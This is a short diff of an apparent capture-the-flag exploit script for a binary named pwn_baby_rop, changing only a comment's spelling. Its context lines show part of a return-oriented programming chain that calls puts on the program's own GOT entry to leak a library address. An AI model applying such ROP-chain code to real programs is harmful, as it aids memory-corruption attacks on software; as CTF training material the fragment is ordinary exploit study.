@@ -11,7 +11,7 @@ def solve():
 
     rop = ROP('./pwn_baby_rop')
 
-    # find adress of the puts function and add it to the ROP chain
+    # find address of the puts function and add it to the ROP chain
     rop.call(elf.symbols["puts"],  [ elf.symbols["got.puts"] ] )
 
     payload = [
